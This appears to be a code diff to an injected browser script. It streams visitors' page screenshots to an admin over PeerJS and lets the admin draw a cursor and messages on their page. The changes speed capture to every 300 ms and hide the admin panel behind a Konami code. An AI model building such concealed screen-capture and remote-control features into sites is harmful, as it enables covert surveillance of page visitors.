@@ -351,7 +351,6 @@
     localStorage.removeItem('cst-admin');
     if (hub) { hub.destroy(); hub = null; }
     panelEl?.remove(); panelEl = null;
-    document.getElementById('cst-adminbtn')?.remove();
   }
 
   // ─── key manager ─────────────────────────────────────────────
@@ -476,7 +475,13 @@
       const cv = document.getElementById('cp-vc');
       if (!cv) return;
       const img = new Image();
-      img.onload = () => { cv.width = img.width; cv.height = img.height; cv.getContext('2d').drawImage(img, 0, 0); };
+      img.onload = () => {
+        // Only reset dimensions when they actually change to avoid canvas clear flash
+        if (cv.width !== img.width || cv.height !== img.height) {
+          cv.width = img.width; cv.height = img.height;
+        }
+        cv.getContext('2d').drawImage(img, 0, 0);
+      };
       img.src = d.data;
     }
   }
@@ -487,12 +492,17 @@
     const ids = Object.keys(clients);
     if (!ids.length) { list.innerHTML = '<p style="color:#333;font-size:.82rem;">no clients connected.</p>'; return; }
     list.innerHTML = ids.map(id => {
-      const c  = clients[id];
-      const vp = c.vp ? `${c.vp.w}×${c.vp.h}` : '?';
+      const c      = clients[id];
+      const online = c.conn && c.conn.open;
+      const dot    = `<span style="display:inline-block;width:7px;height:7px;border-radius:50%;` +
+                     `background:${online ? '#44ff77' : '#ff5555'};margin-right:5px;flex-shrink:0;` +
+                     `box-shadow:0 0 4px ${online ? 'rgba(68,255,119,.6)' : 'rgba(255,85,85,.4)'};"></span>`;
+      const vp     = c.vp ? `${c.vp.w}×${c.vp.h}` : '?×?';
+      const status = online ? 'online' : 'offline';
       return `<div class="ccl${viewTarget === id ? ' sel' : ''}">
         <div class="ccl-info" onclick="__cstView('${id}')">
-          <div class="cn2">${c.name}${c.approved ? '' : ' <span style="color:#ffaa44;font-size:.7rem;">(pending)</span>'}</div>
-          <div class="cm">${vp} · ${c.url}</div>
+          <div class="cn2" style="display:flex;align-items:center;">${dot}${c.name}${c.approved ? '' : ' <span style="color:#ffaa44;font-size:.7rem;margin-left:4px;">(pending)</span>'}</div>
+          <div class="cm" style="margin-left:12px;">${status} · ${vp} · ${c.url}</div>
         </div>
         <button class="cbtn r" onclick="__cstRemove('${id}')" style="flex-shrink:0;">remove</button>
       </div>`;
@@ -543,6 +553,7 @@
     loadPeerJS(() => {
       cPeer = new Peer(undefined, { debug: 0 });
       let adminConn  = null;
+      let connecting = false;
       let capturing  = false;
       let capTimer   = null;
       let virCur     = null;
@@ -563,12 +574,18 @@
           }
           return;
         }
+        // Guard: don't create multiple simultaneous connection attempts
+        if (connecting) return;
+        connecting = true;
         try {
-          adminConn = cPeer.connect(HUB, { reliable: true });
-          adminConn.on('open', () => {
+          const conn = cPeer.connect(HUB, { reliable: true });
+          adminConn = conn;
+          conn.on('open', () => {
+            if (adminConn !== conn) { try { conn.close(); } catch {} return; }
+            connecting = false;
             const approved = isApproved();
             const appr     = approved ? JSON.parse(localStorage.getItem('cst-approved')) : null;
-            adminConn.send({
+            conn.send({
               type: 'hello',
               vp:       { w: innerWidth, h: innerHeight },
               url:      location.hostname,
@@ -577,13 +594,17 @@
             });
             // If gate is waiting for admin, send register request now
             if (window.__cstPendingKey) {
-              adminConn.send({ type: 'register-key', key: window.__cstPendingKey });
+              conn.send({ type: 'register-key', key: window.__cstPendingKey });
             }
           });
-          adminConn.on('data',  onAdminMsg);
-          adminConn.on('close', () => { adminConn = null; stopCap(); hideCur(); });
-          adminConn.on('error', () => { adminConn = null; });
-        } catch {}
+          conn.on('data',  onAdminMsg);
+          conn.on('close', () => {
+            if (adminConn === conn) { adminConn = null; connecting = false; stopCap(); hideCur(); }
+          });
+          conn.on('error', () => {
+            if (adminConn === conn) { adminConn = null; connecting = false; }
+          });
+        } catch { connecting = false; }
       }
 
       window.__cstBeaconRegister = () => {
@@ -602,14 +623,38 @@
       function getCur() {
         if (!virCur) {
           virCur = document.createElement('div');
-          virCur.style.cssText = 'position:fixed;z-index:2147483644;pointer-events:none;width:15px;height:15px;' +
-            'border-radius:50%;background:rgba(255,50,50,.8);box-shadow:0 0 6px rgba(255,0,0,.7),0 0 16px rgba(255,0,0,.25);' +
-            'transform:translate(-50%,-50%);display:none;transition:left .07s,top .07s;';
+          virCur.style.cssText = 'position:fixed;z-index:2147483644;pointer-events:none;' +
+            'width:22px;height:26px;display:none;transition:left .06s,top .06s;';
+          virCur.innerHTML = `<svg width="22" height="26" viewBox="0 0 22 26" xmlns="http://www.w3.org/2000/svg" style="display:block;overflow:visible;">
+  <defs>
+    <filter id="cst-cshadow" x="-60%" y="-60%" width="220%" height="220%">
+      <feDropShadow dx="1.5" dy="1.5" stdDeviation="2" flood-color="rgba(0,0,0,0.55)"/>
+    </filter>
+    <filter id="cst-cglow" x="-80%" y="-80%" width="260%" height="260%">
+      <feGaussianBlur stdDeviation="3" result="b"/>
+      <feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
+    </filter>
+  </defs>
+  <path filter="url(#cst-cglow)" d="M3.5 2.5 L3.5 20.5 L8 15.5 L11.2 23.5 L14 22.5 L10.8 14.5 L18 14.5 Z"
+    fill="rgba(255,60,60,0.35)" stroke="none"/>
+  <path filter="url(#cst-cshadow)" d="M3.5 2.5 L3.5 20.5 L8 15.5 L11.2 23.5 L14 22.5 L10.8 14.5 L18 14.5 Z"
+    fill="#ff3232" stroke="white" stroke-width="1.4" stroke-linejoin="round" stroke-linecap="round"/>
+</svg>`;
           document.body.appendChild(virCur);
         }
         return virCur;
       }
-      function showCur(x, y) { const c = getCur(); c.style.display='block'; c.style.left=x+'vw'; c.style.top=y+'vh'; }
+      function showCur(x, y) {
+        const c = getCur();
+        c.style.display = 'block';
+        c.style.left = x + 'vw';
+        c.style.top  = y + 'vh';
+        // Keep active message bubble following the cursor
+        if (lastMsg && lastMsg.parentNode) {
+          lastMsg.style.left = x + '%';
+          lastMsg.style.top  = Math.min(y + 7, 88) + '%';
+        }
+      }
       function hideCur() { if (virCur) virCur.style.display = 'none'; }
 
       function getLayer() {
@@ -632,17 +677,21 @@
 
       function showMsg(text, xp, yp) {
         if (lastMsg && lastMsg.parentNode) {
-          lastMsg.style.top = (parseFloat(lastMsg.style.top) + 6) + '%';
+          // Dismiss previous bubble quickly if still showing
+          breakMsg(lastMsg);
         }
         const el = document.createElement('div');
-        el.style.cssText = `position:absolute;left:${xp}%;top:${yp}%;transform:translateX(-50%);
+        // Offset bubble 7% below cursor so it doesn't hide the pointer
+        const ty = Math.min(yp + 7, 88);
+        el.style.cssText = `position:absolute;left:${xp}%;top:${ty}%;transform:translateX(-50%);
           background:rgba(6,6,6,.92);color:#fff;font-family:system-ui,sans-serif;
           font-size:.84rem;padding:8px 14px;border-radius:7px;border:1px solid rgba(255,50,50,.3);
-          max-width:250px;word-break:break-word;animation:cst-pop .22s ease-out;`;
+          max-width:260px;word-break:break-word;animation:cst-pop .22s ease-out;
+          transition:left .06s,top .06s;white-space:pre-wrap;`;
         el.textContent = text;
         getLayer().appendChild(el);
         lastMsg = el;
-        setTimeout(() => breakMsg(el), 4000);
+        setTimeout(() => breakMsg(el), 4500);
       }
 
       function breakMsg(el) {
@@ -677,11 +726,15 @@
 
       function startCap() {
         if (capTimer) return;
+        let busy = false;
         capTimer = setInterval(async () => {
-          if (!capturing || !adminConn?.open) return;
-          const data = await grab();
-          if (data && adminConn?.open) adminConn.send({ type: 'frame', data });
-        }, 2000);
+          if (!capturing || !adminConn?.open || busy) return;
+          busy = true;
+          try {
+            const data = await grab();
+            if (data && adminConn?.open) adminConn.send({ type: 'frame', data });
+          } finally { busy = false; }
+        }, 300);
       }
       function stopCap() { capturing = false; if (capTimer) { clearInterval(capTimer); capTimer = null; } }
 
@@ -694,8 +747,8 @@
           });
         }
         try {
-          const c = await html2canvas(document.body, { scale:.35, logging:false, useCORS:false, allowTaint:true });
-          return c.toDataURL('image/jpeg', .45);
+          const c = await html2canvas(document.body, { scale:.4, logging:false, useCORS:false, allowTaint:true });
+          return c.toDataURL('image/jpeg', .6);
         } catch { return null; }
       }
     });
@@ -710,25 +763,11 @@
     document.head.appendChild(s);
   }
 
-  // ─── floating admin button ───────────────────────────────────
-  function addAdminBtn() {
-    if (document.getElementById('cst-adminbtn')) return;
-    const b = document.createElement('button');
-    b.id = 'cst-adminbtn'; b.title = 'admin panel'; b.textContent = '⚙';
-    b.style.cssText = 'position:fixed;bottom:14px;right:14px;z-index:2147483645;' +
-      'width:30px;height:30px;background:#0c0000;color:#cc3333;border:1px solid #280000;' +
-      'border-radius:50%;cursor:pointer;font-size:.85rem;opacity:.5;' +
-      'display:flex;align-items:center;justify-content:center;';
-    b.onmouseenter = () => b.style.opacity = '1';
-    b.onmouseleave = () => b.style.opacity = '.5';
-    b.onclick = openPanel;
-    document.body.appendChild(b);
-  }
-
   // ─── init ────────────────────────────────────────────────────
   function init() {
     if (isAdmin) {
-      addAdminBtn();
+      // Admin: panel opens via Konami code (← → ← → ↑ ↓ A B) + passcode
+      // No visible button — keep it hidden
     } else {
       startBeacon();
       if (!isApproved()) {
